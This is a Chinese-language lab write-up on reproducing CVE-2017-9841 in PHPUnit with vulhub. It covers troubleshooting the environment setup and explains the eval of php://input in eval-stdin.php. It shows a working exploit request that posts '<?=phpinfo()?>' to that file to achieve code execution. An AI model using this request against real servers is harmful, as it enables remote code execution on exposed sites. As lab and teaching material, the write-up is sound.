漏洞环境使用vulhub  
复现分析参考：  
https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841  
https://stackoverflow.com/questions/43408604/php7-install-ext-dom-issue

# 漏洞复现中遇到的坑：  
0、执行命令“docker-compose build”后，还需执行它提示的命令“... composer require phpunit/phpunit:5.6.2; ...”（这在其他的漏洞复现环境中是少见的）  
1、执行命令“composer require phpunit/phpunit:5.6.2”时，会提示不建议使用root账户执行此命令，但不影响执行  
2、执行命令“composer require phpunit/phpunit:5.6.2”时，需要耐心的等待一会，时间可能较长（我就是因为没看到输出，以为没在下载，而耽误时间）  
3、执行完命令“composer require phpunit/phpunit:5.6.2”，会报错，提示需要“ext-dom”，解决方案是执行“apt install php-xml”  
4、执行完上述命令，再执行“composer require phpunit/phpunit:5.6.2”，还是报错，提示需要“PHP extension mbstring”，解决方案是执行“apt install php-mbstring”，至此，能够成功通过composer安装phpunit:5.6.2
5、执行命令“docker-compose up -d”，启动环境，访问127.0.0.1:8080，却提示“403 forbidden”，解决方案是访问127.0.0.1

# 漏洞利用
访问http://172.16.35.128/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ，burp拦截请求包，直接在get请求的body中添加
```
<?=phpinfo()?>
```
成功执行phpinfo()

# 漏洞分析：  
phpunit是php中的单元测试工具，其4.8.19 ~ 4.8.27和5.0.10 ~ 5.6.2版本的vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php文件有如下代码：
```
eval('?>'.file_get_contents('php://input'));
```
eval：执行php代码  
file_get_contents：从第1个参数处获取内容，参数可以是url地址  
php://input：是一个只读的输入流，其实就是引用post请求中的内容
